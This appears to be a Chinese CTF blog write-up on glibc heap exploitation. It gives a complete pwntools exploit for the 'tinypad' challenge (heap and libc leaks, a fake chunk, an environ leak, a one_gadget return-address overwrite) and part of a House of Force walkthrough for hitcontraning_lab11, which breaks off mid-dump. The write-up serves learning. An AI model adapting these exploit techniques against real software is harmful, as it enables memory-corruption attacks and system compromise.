<p>自己调试的时候可以main函数尾部下个断，可以看到我这个结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1, 0x0000000000400e68 <span class="keyword">in</span> main ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x7f5fc76f6ae0 (_nl_C_LC_CTYPE_toupper) ◂— add    byte ptr [rax], 0</span><br><span class="line"> RDI  0x51</span><br><span class="line"> RSI  0x0</span><br><span class="line"> R8   0x1</span><br><span class="line"> R9   0x1999999999999999</span><br><span class="line"> R10  0x0</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x4006e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fff53d21f40 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x401370 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fff53d21e68 —▸ 0x7f5fc75a0830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line"> RIP  0x400e68 (main+1541) ◂— ret    </span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x400e68       &lt;main+1541&gt;                ret             &lt;0x7f5fc75a0830; __libc_start_main+240&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f5fc75a0830 &lt;__libc_start_main+240&gt;    mov    edi, eax</span><br><span class="line">   0x7f5fc75a0832 &lt;__libc_start_main+242&gt;    call   <span class="built_in">exit</span> &lt;0x7f5fc75ba030&gt;</span><br><span class="line"> </span><br><span class="line">   0x7f5fc75a0837 &lt;__libc_start_main+247&gt;    xor    edx, edx</span><br><span class="line">   0x7f5fc75a0839 &lt;__libc_start_main+249&gt;    jmp    __libc_start_main+57 &lt;0x7f5fc75a0779&gt;</span><br><span class="line"> </span><br><span class="line">   0x7f5fc75a083e &lt;__libc_start_main+254&gt;    mov    rax, qword ptr [rip + 0x3a8ecb] &lt;0x7f5fc7949710&gt;</span><br><span class="line">   0x7f5fc75a0845 &lt;__libc_start_main+261&gt;    ror    rax, 0x11</span><br><span class="line">   0x7f5fc75a0849 &lt;__libc_start_main+265&gt;    xor    rax, qword ptr fs:[0x30]</span><br><span class="line">   0x7f5fc75a0852 &lt;__libc_start_main+274&gt;    call   rax</span><br><span class="line"> </span><br><span class="line">   0x7f5fc75a0854 &lt;__libc_start_main+276&gt;    mov    rax, qword ptr [rip + 0x3a8ea5] &lt;0x7f5fc7949700&gt;</span><br><span class="line">   0x7f5fc75a085b &lt;__libc_start_main+283&gt;    ror    rax, 0x11</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fff53d21e68 —▸ 0x7f5fc75a0830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">01:0008│      0x7fff53d21e70 ◂— 0x1</span><br><span class="line">02:0010│      0x7fff53d21e78 —▸ 0x7fff53d21f48 —▸ 0x7fff53d233b3 ◂— <span class="string">'./tinypad'</span></span><br><span class="line">03:0018│      0x7fff53d21e80 ◂— 0x1c7b6fca0</span><br><span class="line">04:0020│      0x7fff53d21e88 —▸ 0x400863 (main) ◂— push   rbp</span><br><span class="line">05:0028│      0x7fff53d21e90 ◂— 0x0</span><br><span class="line">06:0030│      0x7fff53d21e98 ◂— 0x63cd5245d4e10d9c</span><br><span class="line">07:0038│      0x7fff53d21ea0 —▸ 0x4006e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0           400e68 main+1541</span><br><span class="line">   f 1     7f5fc75a0830 __libc_start_main+24</span><br></pre></td></tr></table></figure>



<p>为什么是libc_start_main?建议看看第三篇讲的linux x86程序启动<br>给链接</p>
<p><a href="https://luomuxiaoxiao.com/?p=516" target="_blank" rel="noopener">linux_x86程序启动中文版</a><br><a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html" target="_blank" rel="noopener">linux_x86程序启动英文版</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">84	../sysdeps/unix/syscall-template.S: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> RAX  0xfffffffffffffe00</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7f30af211260 (__read_nocancel+7) ◂— cmp    rax, -0xfff</span><br><span class="line"> RDX  0x1</span><br><span class="line"> RDI  0x0</span><br><span class="line"> RSI  0x7fff48b59964 ◂— 0x7b51190000000000</span><br><span class="line"> R8   0x1</span><br><span class="line"> R9   0x1999999999999999</span><br><span class="line"> R10  0x0</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x4006e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fff48b59a80 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fff48b59900 —▸ 0x7fff48b59950 —▸ 0x7fff48b59970 —▸ 0x7fff48b599a0 —▸ 0x401370 (__libc_csu_init) ◂— ...</span><br><span class="line"> RSP  0x7fff48b598b8 —▸ 0x400ed9 (_read_n+112) ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class="line"> RIP  0x7f30af211260 (__read_nocancel+7) ◂— cmp    rax, -0xfff</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► 0x7f30af211260 &lt;__read_nocancel+7&gt;     cmp    rax, -0xfff</span><br><span class="line">   0x7f30af211266 &lt;__read_nocancel+13&gt;    jae    <span class="built_in">read</span>+73 &lt;0x7f30af211299&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f30af211299 &lt;<span class="built_in">read</span>+73&gt;               mov    rcx, qword ptr [rip + 0x2ccbd8]</span><br><span class="line">   0x7f30af2112a0 &lt;<span class="built_in">read</span>+80&gt;               neg    eax</span><br><span class="line">   0x7f30af2112a2 &lt;<span class="built_in">read</span>+82&gt;               mov    dword ptr fs:[rcx], eax</span><br><span class="line">   0x7f30af2112a5 &lt;<span class="built_in">read</span>+85&gt;               or     rax, 0xffffffffffffffff</span><br><span class="line">   0x7f30af2112a9 &lt;<span class="built_in">read</span>+89&gt;               ret    </span><br><span class="line"> </span><br><span class="line">   0x7f30af2112aa                         nop    word ptr [rax + rax]</span><br><span class="line">   0x7f30af2112b0 &lt;write&gt;                 cmp    dword ptr [rip + 0x2d2489], 0 &lt;0x7f30af4e3740&gt;</span><br><span class="line">   0x7f30af2112b7 &lt;write+7&gt;               jne    write+25 &lt;0x7f30af2112c9&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f30af2112c9 &lt;write+25&gt;              sub    rsp, 8</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fff48b598b8 —▸ 0x400ed9 (_read_n+112) ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class="line">01:0008│      0x7fff48b598c0 —▸ 0x7fff48b598f0 —▸ 0x4018d8 (prompt_cmd) ◂— sub    byte ptr [rbx + 0x4d], al /* <span class="string">'(CMD)&gt;&gt;&gt; '</span> */</span><br><span class="line">02:0010│      0x7fff48b598c8 ◂— 0x1</span><br><span class="line">03:0018│      0x7fff48b598d0 —▸ 0x7fff48b59964 ◂— 0x7b51190000000000</span><br><span class="line">04:0020│      0x7fff48b598d8 —▸ 0x400fad (_write_n+112) ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class="line">05:0028│      0x7fff48b598e0 —▸ 0x401a29 ◂— or     al, byte ptr [rax] /* <span class="string">'\n'</span> */</span><br><span class="line">06:0030│      0x7fff48b598e8 ◂— 0x0</span><br><span class="line">07:0038│      0x7fff48b598f0 —▸ 0x4018d8 (prompt_cmd) ◂— sub    byte ptr [rbx + 0x4d], al /* <span class="string">'(CMD)&gt;&gt;&gt; '</span> */</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0     7f30af211260 __read_nocancel+7</span><br><span class="line">   f 1           400ed9 _read_n+112</span><br><span class="line">   f 2           401100 read_until+73</span><br><span class="line">   f 3           400832 getcmd+92</span><br><span class="line">   f 4           4009c1 main+350</span><br><span class="line">   f 5     7f30af13a830 __libc_start_main+240</span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ find <span class="string">'0x7f30af13a830'</span></span><br><span class="line">Searching <span class="keyword">for</span> <span class="string">'0x7f30af13a830'</span> <span class="keyword">in</span>: None ranges</span><br><span class="line">Found 1 results, display max 1 items:</span><br><span class="line">[stack] : 0x7fff48b599a8 --&gt; 0x7f30af13a830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)</span><br><span class="line">gdb-peda$ p 0x7fff48b599a8-0x7fff48b59a98</span><br><span class="line"><span class="variable">$1</span> = 0xffffffffffffff10</span><br><span class="line">gdb-peda$ p 0x7fff48b59a98-0x7fff48b599a8</span><br><span class="line"><span class="variable">$2</span> = 0xf0</span><br></pre></td></tr></table></figure>

<p>这里说下怎么找偏移，<br>从environ里leak出来的地址[+] main_ret: 0x7fff48b59a98，在与find出来的地址，find  的话，是find上面的f5那个地址，就是查找存了这个地址的位置，然后计算下偏移就行了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p 0x7fff48b59a98-0x7fff48b599a8</span><br><span class="line"><span class="variable">$2</span> = 0xf0</span><br></pre></td></tr></table></figure>



<p>完结，撒花</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./tinypad'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">'./tinypad'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"(CMD)&gt;&gt;&gt; "</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="string">"A"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(SIZE)&gt;&gt;&gt; "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"(CONTENT)&gt;&gt;&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="string">"D"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(INDEX)&gt;&gt;&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="string">"E"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(INDEX)&gt;&gt;&gt; "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"(CONTENT)&gt;&gt;&gt; "</span>, content)</span><br><span class="line">    io.sendlineafter(<span class="string">"(Y/n)&gt;&gt;&gt; "</span>, <span class="string">"Y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="string">"Q"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#stage 1 leak the addr</span></span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'1'</span>*<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'2'</span>*<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'3'</span>*<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'4'</span>*<span class="number">0x80</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line">    remove(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"INDEX: 1\n"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">    heap = u64(io.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x120</span></span><br><span class="line">    io.success(<span class="string">"heap: 0x%x"</span> % heap)</span><br><span class="line">    io.recvuntil(<span class="string">"INDEX: 3\n"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">    leak_libc = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">88</span></span><br><span class="line">    io.success(<span class="string">"main_arena: 0x%x"</span> %leak_libc)</span><br><span class="line">    libc_base = leak_libc - <span class="number">0x3c4b20</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">4</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#stage 2</span></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">'1'</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'2'</span>*<span class="number">0xf8</span> + p64(<span class="number">0x11</span>))</span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'3'</span>*<span class="number">0xf8</span>)</span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'4'</span>*<span class="number">0xf8</span>)</span><br><span class="line">    </span><br><span class="line">    tinypad = <span class="number">0x0000000000602040</span></span><br><span class="line">    offset = heap + <span class="number">0x20</span> - (<span class="number">0x602040</span> + <span class="number">0x20</span>)</span><br><span class="line">    io.success(<span class="string">"offset: 0x%x"</span> % offset)</span><br><span class="line">    fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(<span class="number">0x602060</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">3</span>, <span class="string">"4"</span>*<span class="number">0x20</span> + fake_chunk)</span><br><span class="line">    remove(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x18</span>, <span class="string">'1'</span>*<span class="number">0x10</span> + p64(offset))</span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">"4"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(leak_libc + <span class="number">88</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#stage 3</span></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x45216</span></span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    environ_pointer = libc_base + libc.symbols[<span class="string">'__environ'</span>]</span><br><span class="line"></span><br><span class="line">    io.success(<span class="string">"environ_pointer: 0x%x"</span> % environ_pointer)</span><br><span class="line">    add(<span class="number">0xf0</span>, <span class="string">'1'</span>*<span class="number">0xd0</span> + p64(<span class="number">0x18</span>) + p64(environ_pointer) + <span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0x602148</span>))</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">" #   INDEX: 1\n"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">    main_ret = u64(io.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x8</span> * <span class="number">30</span></span><br><span class="line">    io.success(<span class="string">"main_ret: %x"</span> % main_ret)</span><br><span class="line">    edit(<span class="number">2</span>, p64(main_ret))</span><br><span class="line">    edit(<span class="number">1</span>, p64(one_gadget))</span><br><span class="line">    quit()</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="hitcontraning-lab11"><a href="#hitcontraning-lab11" class="headerlink" title="hitcontraning_lab11"></a>hitcontraning_lab11</h2><p>这题算是实验，所以直接调试exp，<br>运行环境： libc2.23.so </p>
<p>最新的libc2.29似乎加入了检查，运行exp报错</p>
<h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>申请一个堆块状态，目的是覆盖top chunk</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/30gx 0x25ed000</span><br><span class="line">0x25ed000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x25ed010:	0x0000000000400896	0x00000000004008b1</span><br><span class="line">0x25ed020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x25ed030:	0x0000000a61616464	0x0000000000000000</span><br><span class="line">0x25ed040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed060:	0x0000000000000000	0x0000000000020fa1</span><br><span class="line">0x25ed070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x25ed0e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>通过edit 覆盖到top chunk的size部分</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/30gx 0x25ed030-0x30</span><br><span class="line">0x25ed000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x25ed010:	0x0000000000400896	0x00000000004008b1</span><br><span class="line">0x25ed020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x25ed030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x25ed040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x25ed050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x25ed060:	0x6161616161616161	0xffffffffffffffff</span><br><span class="line">0x25ed070:	0x000000000000000a	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>此时top chunk位置0x00000000025ed060</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p &amp;main_arena</span><br><span class="line"><span class="variable">$1</span> = (malloc_state *) 0x7f2a72614b20 &lt;main_arena&gt;</span><br><span class="line">gdb-peda$ x/20gx 0x7f2a72614b20</span><br><span class="line">0x7f2a72614b20 &lt;main_arena&gt;:	0x0000000100000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00000000025ed060</span><br></pre></td></tr></table></figure>

<p>位置为0x25ed060处，我们要覆盖的是0x25ed010处指针，故偏移为0x25ed060-0x25ed010-0x10 = 0x60</p>
<p>不过是负的，我们要往上偏移，所以要malloc(-)的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (req) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (INTERNAL_SIZE_T)(<span class="number">-2</span> * MINSIZE))</span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="line">         ? MINSIZE                                                             \</span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span><br><span class="line">        __set_errno(ENOMEM);                                                   \</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;                                                              \</span><br><span class="line">    &#125;                                                                          \</span><br><span class="line">    (sz) = request2size(req);</span><br></pre></td></tr></table></figure>

<p>这里先要过掉第一个检查， -2*MINSIZE，可以pass,接下来要让我们的<br>((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) 刚好等于=-60<br>所以要减掉个SIZE_SZ, -68就是malloc大小了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p &amp;main_arena</span><br><span class="line"><span class="variable">$1</span> = (malloc_state *) 0x7f2a72614b20 &lt;main_arena&gt;</span><br><span class="line">gdb-peda$ x/20gx 0x7f2a72614b20</span><br><span class="line">0x7f2a72614b20 &lt;main_arena&gt;:	0x0000000100000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f2a72614b50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span 